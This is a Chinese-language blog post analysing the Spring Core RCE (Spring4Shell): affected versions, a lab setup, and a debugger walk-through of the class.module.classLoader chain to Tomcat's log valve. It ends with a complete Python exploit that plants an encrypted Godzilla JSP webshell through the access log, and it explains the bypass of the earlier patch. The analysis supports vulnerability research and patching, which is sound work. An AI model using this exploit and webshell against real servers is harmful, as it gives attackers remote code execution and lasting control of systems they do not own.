---
title: Spring-Core-Rce
tags:
  - Java
  - RCE
  - Spring
categories: 
  - Java
  - SpringCore
  - RCE
description: Spring Core分析
excerpt: Spring Core分析
typora-root-url: Spring-Core-Rce
abbrlink: 8226
date: 2022-04-04 11:05:52
---

## Spring Core RCE 分析

### 影响范围

* JDK >= 9

* Spring开发或衍生框架开发（存在spring-bean*.jar）

  spring-framework < v5.3.18

  spring-framework < v5.2.20.RELEASE

应立即更新Spring-Framework版本至5.3.18或5.2.20.RELEASE以避免该漏洞的攻击。

### 漏洞具体分析

> 这里有一个问题，在Win平台下Tomcat8.5.78不能成功。

#### 项目创建

先自己创一个Spring项目，我给出的Pom如下：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.6.3</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>
    <groupId>com.example</groupId>
    <artifactId>SpringCoreRce</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <packaging>war</packaging>
    <name>SpringCoreRce</name>
    <description>SpringCoreRce</description>
    <properties>
        <java.version>1.8</java.version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-tomcat</artifactId>
            <scope>provided</scope>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>

</project>
```

推荐使用start.spring.io下载初始项目文件后修改版本号，另外要选War。

#### 基础代码

先创建一个简单的POJO：

```java
package com.example.springcorerce.POJO;

public class User {
    private int id;
    private String name;

    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }
}

```

再创建一个简单的Controller：

```java
package com.example.springcorerce.Controller;

import com.example.springcorerce.POJO.User;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class IndexController {

    @RequestMapping("/")
    public String index(User user){
        return "try to exploit me.";
    }
}
```

完成后部署到Tomcat，即可复现：

![image-20220404112706805](./image-20220404112706805.png)

#### 具体分析

先在`org.springframework.beans.BeanWrapperImpl::getLocalPropertyHandler(String propertyName)`下个断点，然后看一下CachedIntrospectionResults对应的对象。

> 注意需要传参，比如传一个id或name，这也才会进入POJO参数绑定的逻辑。

可以看到有一个class缓存：

![image-20220404131752050](./image-20220404131752050.png)

这里的Class缓存，实际上为一个GenericTypeAwarePropertyDescriptor类，包装的`java.lang.Class`类：

![image-20220404132000949](./image-20220404132000949.png)

在可以读取一个Class对象的时候，我们可以通过：

```java
clazz.module
```

访问一个`java.lang.Module`对象，通过Module对象的`classLoader`访问一个上下文中的`ClassLoader`，而当我们将SpringMVC项目部署在Tomcat上，我们获取到的一个`classLoader`实际上为：

![image-20220404134453804](./image-20220404134453804.png)

这是Tomcat Catalina的一个`ClassLoader`，于是可以顺利成章的拿到Tomcat的AccessLogValve对象：

```java
((StandardPipeline) ((StandardHost) ((StandardContext) ((StandardRoot) ((ParallelWebappClassLoader) ((Class) ((BeanWrapperImpl)this).rootObject).module.loader).resources).context).parent).pipeline).first
```

![image-20220404135822681](./image-20220404135822681.png)

而我们可以通过`org.springframework.beans/AbstractNestablePropertyAccessor::setPropertyValue`进行属性注入。

值得一提的是，该类在进行`setPropertyValue`时，允许使用嵌套属性的数据结构，这对于实际Web应用而言可能比较重要。

例如，POJO是Form，Form中有两个成员分别是User对象以及Capath对象，这个时候允许使用嵌套属性，我们提交的表单可能就非常简单：

```http
http://server/?user.uid=11&user.pwd=22&capath.code=yzm
```

对于简化开发流程而言有着不错的效果。

但是在此处，这也极大的方便了我们进行属性覆盖。

前面提到，我们可以通过通过Class.getModule()拿到一个Module对象，从而不断地深入拿到Tomcat Catalina的AccessLogValve对象，通过对该对象进行属性覆盖，我们就能控制Tomcat的日志写向，以及日志写出内容。

于是通过日志写WebShell就顺理成章了。

![image-20220404141609391](./image-20220404141609391.png)

最终的一个exp如下：

```python
import requests

header_name = 'springcore'
headers = {
    header_name: "%",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4606.61 Safari/537.36"
}
jsp_shell = '<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>'

jsp_shell = jsp_shell.replace("%", "%{"+header_name+"}i")

data = {
    "class.module.classLoader.resources.context.parent.pipeline.first.pattern": jsp_shell+"<!--",
    "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
    "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
    "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "index0000",
    "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": ""
}

requests.post(url="http://localhost:8080/SpringCoreRce/", data=data, headers=headers)
```

> 由于%号会被过滤，因此你必须使用另外的方式将这个符号传入，这里我们通过引用%{springcore}i，即使用Header属性来传递%号。

你可以修改其中的jsp_shell，这里的jsp_shell实际为哥斯拉的WebShell。

#### 深究

* 为什么JDK8不行？

  * Module机制是JDK 9引入的，使用JDK 8编译项目并启动Tomcat，User.getClass()返回的Class对象中都没有getModule()方法，更别提获取Module对象了。

  ![image-20220404145749161](./image-20220404145749161.png)

  

* 为什么是SpringMVC，SpringBoot行不行？

  * ClassLoader不一样了，SpringMVC的ClassLoader是`ParalleWebappClassLoader`，而SpringBoot使用的是`AppClassLoader`，`AppClassLoader`没有`getResources()`方法，无法拿到`resources`属性。

* 为什么不通过Class.classLoader拿到classLoader，而是选择使用Module去拿？

  * 这个是之前的补丁，`CachedIntrospectionResults`的构造函数中：

  ```java
  private CachedIntrospectionResults(Class<?> beanClass) throws BeansException {
  		//...
  			// This call is slow so we do it once.
  			PropertyDescriptor[] pds = this.beanInfo.getPropertyDescriptors();
  			for (PropertyDescriptor pd : pds) {
  				if (Class.class == beanClass &&
  						("classLoader".equals(pd.getName()) ||  "protectionDomain".equals(pd.getName()))) {
  					// Ignore Class.getClassLoader() and getProtectionDomain() methods - nobody needs to bind to those
  					continue;
  				}
  		//...
  	}
  ```

  显然class是一个Class对象，如果我们接下来的属性名是classLoader，那么就会被忽略，从这里可以看到是没有办法直接使用`class.classLoader`去拿到Tomcat的StandardHost对象。

  但是`class.module`本身不是一个Class对象，因此`Class.class == beanClass`此处就会判断为False，自然不会进行后面的检测，从而绕过了。

### 总结

能够利用的条件比较的苛刻：

* `JDK>=9` (引入Module系统)
* SpringMVC (`ClassLoader`为`ParalleWebappClassLoader`)
* 请求接口为控制器方法
* 接口参数为POJO (参数绑定)

